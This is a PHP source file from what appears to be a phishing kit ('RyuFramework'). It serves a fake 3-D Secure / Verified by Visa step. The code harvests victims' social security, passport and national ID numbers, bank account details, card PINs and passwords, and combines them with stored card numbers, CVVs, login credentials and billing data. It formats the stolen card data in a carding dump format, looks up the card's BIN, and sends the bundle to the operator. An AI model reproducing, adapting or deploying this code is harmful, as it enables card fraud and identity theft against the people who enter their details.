<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:27 )
* @filename x3dsecure.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
/*** LOG CONFIG FOR STATS ***/
$continue = $this->router('x3dsecure')['short'];
$type_log = 'card-vbv';
$desc_log  = 'CARD WITH VBV';
////////////////////////////

/**** SENDING CONFIG ***/
$type_send = 'card-vbv';
$subject_send ='';
$form_send = '';
////////////////////////



if($this->getPost())
{
$data = [];

$ssn = $this->getPost()['ssn'];
$data['ssn'] = $ssn; 


$qatarid = $this->getPost()['qatarid'];
$data['qatarid'] = $qatarid; 


$idnumber = $this->getPost()['idnumber'];
$data['idnumber'] = $idnumber; 


$citizenid = $this->getPost()['citizenid'];
$data['citizenid'] = $citizenid; 


$nationalid = $this->getPost()['nationalid'];
$data['nationalid'] = $nationalid; 


$sortcode = $this->getPost()['sortcode'];
$data['sortcode'] = $sortcode; 


$passport = $this->getPost()['passport'];
$data['passport'] = $passport; 


$civilid = $this->getPost()['civilid'];
$data['civilid'] = $civilid; 


$ban = $this->getPost()['ban'];
$data['ban'] = $ban; 


$accno = $this->getPost()['accno'];
$data['accno'] = $accno; 


$climit = $this->getPost()['climit'];
$data['climit'] = $climit; 


$bankaccount = $this->getPost()['bankaccount'];
$data['bankaccount'] = $bankaccount; 


$nabid = $this->getPost()['nabid'];
$data['nabid'] = $nabid; 


$cardid = $this->getPost()['cardid'];
$data['cardid'] = $cardid; 


$cardpass = $this->getPost()['cardpass'];
$data['cardpass'] = $cardpass; 


/** ACCOUNT **/
$data['username'] = $this->handler->session('account')['email'];
$data['password'] = $this->handler->session('account')['password'];

/** CARD **/
$cardnumber = $this->handler->session('card')['cardnumber'];
$data['cardnumber'] = $cardnumber; 


$exp_month = $this->handler->session('card')['exp_month'];
$data['exp_month'] = $exp_month; 


$exp_year = $this->handler->session('card')['exp_year'];
$data['exp_year'] = $exp_year; 

$data['expired'] = $exp_month."/".$exp_year;

$cvv = $this->handler->session('card')['cvv'];
$data['cvv'] = $cvv; 


$cardholder = $this->handler->session('card')['cardholder'];
$data['cardholder'] = $cardholder; 

/** BILLING **/
$fullname = $this->handler->session('billing')['fullname'];
$data['fullname'] = $fullname; 


$address = $this->handler->session('billing')['address'];
$data['address'] = $address; 


$city = $this->handler->session('billing')['city'];
$data['city'] = $city; 


$state = $this->handler->session('billing')['state'];
$data['state'] = $state; 


$postcode = $this->handler->session('billing')['postcode'];
$data['postcode'] = $postcode; 


$country = $this->handler->session('billing')['country'];
$data['country'] = $country; 


$phone = $this->handler->session('billing')['phone'];
$data['phone'] = $phone; 


$birthday = $this->handler->session('billing')['birthday'];
$data['birthday'] = $birthday; 

 
$apay = str_replace(" ","",trim($this->handler->session('card')['cardnumber']))."|".$this->handler->session('card')['exp_month']."|".$this->handler->session('card')['exp_year']."|".$this->handler->session('card')['cvv'];
$copy = $apay."|".$this->handler->session('card')['cardholder']."|".$data['address']."|".$data['city']."|".$data['state']."|".$data['postcode']."|".$this->userdata['country']['countryCode']."|".$data['phone'];

  
 /** bin checker */
 $num = $this->handler->session('card')['cardnumber'];
 $num = preg_replace('/\s/', '', $num);
 $num = substr($num,0,6);

 $bin = $this->api->getBin($num);
 /** end bin checker */
 
 /** BINS **/
 $data['bank'] = $bin['bank'];
 $data['brandtype'] = $bin['brand'].' - '.$bin['type'];
 $data['levelcountry'] = $bin['level'].' - '.$bin['country'];
$data['cid'] = $this->handler->post('cid');
$data['copy'] = $apay;
$data['autopay'] = $copy;

  $subject_send = "[".$num."][FULL] ".$bin['brand']." ".$bin['type']." ".$bin['level']." ".$bin['bank']." ".$bin['country'];$form_send = $data['fullname'];$send = ['from' => $form_send,        'subject' => $subject_send,        'type' => $type_send,        'data' => $data    ];
$log = ['type' => $type_log,        'desc' => $desc_log    ];

return $this->send($send,$log,$continue);
 
}
